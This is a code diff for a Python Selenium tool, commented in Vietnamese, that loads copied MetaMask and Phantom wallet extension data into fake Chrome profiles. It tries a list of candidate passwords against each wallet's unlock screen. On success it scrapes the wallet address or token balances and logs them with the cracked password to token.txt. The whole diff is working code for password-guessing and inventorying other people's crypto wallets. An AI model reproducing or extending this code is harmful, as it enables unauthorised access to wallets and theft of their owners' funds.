@@ -9,7 +9,8 @@ import pyautogui
 import numpy as np
 import cv2
 import pytesseract
-import threading
+import tkinter as tk
+
 class ScannerWalletSelenium:
     ref = None
     driver = None
@@ -19,7 +20,8 @@ class ScannerWalletSelenium:
         self.threadCount = threadCount
         self.wallet = wallet
         self.passwordSuccess = None
-        
+        self.balance = ''
+        self.tokenAddress = ''
     def login(self):
         try:
             self.driver.get('chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html')
@@ -44,9 +46,87 @@ class ScannerWalletSelenium:
                             except:
                                 self.passwordSuccess = password
                                 #login Thành công
-                                return True
+                                try:
+                                    btnBalance = self.driver.find_element("xpath", "/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div[1]/div/button")
+                                    self.driver.execute_script("arguments[0].click();", btnBalance)
+                                    root = tk.Tk()
+                                    self.tokenAddress = root.clipboard_get()
+                                except Exception as e:
+                                    print('sao laij excep', e)
+                                    return True
                         try:
                             if self.driver.find_element("id", "password"):
+                                #login thất bại tiếp tục login
+                                return False
+                        except:
+                            print('excep ne')
+                            #login Thành công  
+                            try:
+                                btnBalance = self.driver.find_element("xpath", "/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div[1]/div/button")
+                                self.driver.execute_script("arguments[0].click();", btnBalance)
+                                root = tk.Tk()
+                                self.tokenAddress = root.clipboard_get()
+                            except Exception as e:
+                                print('sao laij excep', e)
+                                return True
+                else:
+                    return False
+            except:
+                try:
+                    if  self.driver.find_element("xpath", "/html/body/div[1]/div/div[2]/div/div/div/div/div/div/ul/li[1]"):
+                        return False
+                except:  
+                    #login Thành công  
+                    try:
+                        btnBalance = self.driver.find_element("xpath", "/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div[1]/div/button")
+                        self.driver.execute_script("arguments[0].click();", btnBalance)
+                        root = tk.Tk()
+                        self.tokenAddress = root.clipboard_get()
+                    except Exception as e:
+                        print('sao laij excep', e)
+                        return True
+                    return True
+        except:
+            return False
+    
+    def loginPhantom(self):
+        try:
+            self.driver.get('chrome-extension://bfnaelmomeimhlpmgjnjophhpkkoljpa/popup.html')
+            time.sleep(5)
+            try:
+                namepassword = self.driver.find_element("name", "password")
+                print('namepassword', namepassword)
+                if self.driver.find_element("name", "password"):
+                    if self.wallet["password"]:
+                        for password in str(self.wallet["password"]).split("|"):
+                            print('dzo ', password)
+                            self.passwordSuccess = password
+                            passElm = self.driver.find_element("name", "password")
+                            passElm.send_keys(Keys.CONTROL + "a")
+                            passElm.send_keys(Keys.DELETE)
+                            passElm.send_keys(password)
+                            btnLogin = self.driver.find_element("xpath", "/html/body/div/div/div[1]/div/div[2]/div/button")
+                            btnLogin.click()
+                            time.sleep(0.3)
+                            try:
+                                if self.driver.find_element("name", "password"):
+                                    #login thất bại tiếp tục login
+                                    continue
+                            except:
+                                self.passwordSuccess = password
+                                #login Thành công
+                                print('logionnnn')
+                                time.sleep(1)
+                                for i in range(0, 5):
+                                    try:
+                                        elementToken = self.driver.find_element("xpath", f"/html/body/div[1]/div/div[1]/div[1]/div/div[2]/div/div/div/div[{i + 1}]/div/div/div[1]/p[1]")
+                                        elementBalance = self.driver.find_element("xpath", f"/html/body/div[1]/div/div[1]/div[1]/div/div[2]/div/div/div/div[{i + 1}]/div/div/div[1]/p[2]")
+                                        self.balance += f'{elementToken.text}:{elementBalance.text.replace("$", "")}'
+                                    except:
+                                        break
+                                return True
+                        try:
+                            if self.driver.find_element("name", "password"):
                                 #login thất bại tiếp tục login
                                 return False
                         except:
@@ -56,6 +136,7 @@ class ScannerWalletSelenium:
                 else:
                     return False
             except:
+                print('dzo here')
                 try:
                     if  self.driver.find_element("xpath", "/html/body/div[1]/div/div[2]/div/div/div/div/div/div/ul/li[1]"):
                         return False
@@ -106,6 +187,34 @@ class ScannerWalletSelenium:
         files = os.listdir(self.wallet["path"])
         for fname in files:
             shutil.copy2(os.path.join(self.wallet["path"], fname), rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn")
+        time.sleep(1)
+        options = webdriver.ChromeOptions()
+        options.add_argument(rf"--user-data-dir=C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake") #e.g. C:\Users\You\AppData\Local\Google\Chrome\User Data
+        options.add_argument(rf'--profile-directory=Profile {profileIndex}') #e.g. Profile 3
+        options.add_argument("--window-size=800,900")
+        options.add_experimental_option("useAutomationExtension", False)
+        options.add_experimental_option("excludeSwitches",["enable logging"])
+        options.add_experimental_option("excludeSwitches", ["enable automation"])
+        options.add_argument("start-maximized")
+        #options to hide window
+        #options.add_argument('headless')
+        self.driver = webdriver.Chrome(options=options)
+        self.driver.delete_all_cookies()
+
+    def initChromePhantom(self):
+        profileIndex = self.threadCount
+        if not os.path.exists(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake"):
+            os.makedirs(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake")
+        
+        #check profile existed 
+        if not os.path.exists(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}"):
+            os.makedirs(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}")
+            self.copytree(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile 0", rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}")
+
+        self.delete_files_and_subdirectories(rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa")
+        files = os.listdir(self.wallet["path"])
+        for fname in files:
+            shutil.copy2(os.path.join(self.wallet["path"], fname), rf"C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake\Profile {profileIndex}\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa")
         time.sleep(1)
         options = webdriver.ChromeOptions()
         options.add_argument(rf"--user-data-dir=C:\Users\{os.getlogin()}\AppData\Local\Google\Chrome\User Data Fake") #e.g. C:\Users\You\AppData\Local\Google\Chrome\User Data
@@ -256,8 +365,7 @@ class ScannerWalletSelenium:
             self.initChromeMetaMask()
             checkLogin = self.login() 
             if checkLogin == True:
-                open("token.txt", 'a+').write("%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess))
-                time.sleep(30)
+                open("token.txt", 'a+').write("%s|%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess, self.tokenAddress))
                 self.ref.checksuccess.emit(True, self.index, "Login thành công")
 
             if checkLogin == False:
@@ -289,11 +397,11 @@ class ScannerWalletSelenium:
                 self.ref.checksuccess.emit(False, self.index, f"Login thất bại")  
                         
         if self.wallet["wallet"] == "Phantom":
-            self.initChromeMetaMask()
-            checkLogin = self.login() 
+            self.initChromePhantom()
+            checkLogin = self.loginPhantom() 
+            print('checkLogin', checkLogin)
             if checkLogin == True:
-                open("token.txt", 'a+').write("%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess))
-                time.sleep(30)
+                open("token.txt", 'a+').write("%s|%s|%s|%s\n"%(self.wallet["path"], self.wallet["wallet"], self.passwordSuccess, self.balance))
                 self.ref.checksuccess.emit(True, self.index, "Login thành công")
 
             if checkLogin == False:
